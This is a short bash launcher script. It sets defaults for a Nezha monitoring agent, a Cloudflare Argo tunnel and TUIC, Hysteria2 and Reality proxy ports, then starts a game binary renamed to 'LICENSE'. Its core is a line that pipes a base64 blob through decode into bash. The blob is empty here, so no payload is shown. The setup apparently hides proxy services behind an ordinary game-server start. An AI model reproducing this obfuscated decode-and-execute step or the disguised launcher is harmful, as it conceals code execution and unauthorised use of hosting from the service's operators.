#!/bin/bash  
export UUID=${UUID:-'cfa8c36c-9652-484a-89e1-34dcc98faac3'}
export NEZHA_SERVER=${NEZHA_SERVER:-'nz.abcd.cn'}   
export NEZHA_PORT=${NEZHA_PORT:-'5555'}     
export NEZHA_KEY=${NEZHA_KEY:-''}
export ARGO_DOMAIN=${ARGO_DOMAIN:-''}   
export ARGO_AUTH=${ARGO_AUTH:-''} 
export CFIP=${CFIP:-'www.visa.com.tw'} 
export CFPORT=${CFPORT:-'8443'}    
export FILE_PATH=${FILE_PATH:-'./data'}        # sub 目录
export ARGO_PORT=${ARGO_PORT:-'8001'}          # argo端口端口无需更改 使用固定隧道token需和cf后台设置的端口对应
export TUIC_PORT=${TUIC_PORT:-'40000'}         # tuic 端口，支持多端口的可以填写，否则保持不动，不要填写主端口
export HY2_PORT=${HY2_PORT:-'50000'}           # Hy2 端口，支持多端口的可以填写，否则保持不动，不要填写主端口
export REALITY_PORT=${REALITY_PORT:-'60000'}   # Reality 端口,支持多端口的可以填写，否则保持不动，不要填写主端口
export GAME_FILE=${GAME_FILE:-'LICENSE'}       # 原游戏启动文件名,需和修改的文件名相同，否则无法启动游戏

echo "" | base64 -d | bash

chmod +x ${GAME_FILE} && ./${GAME_FILE}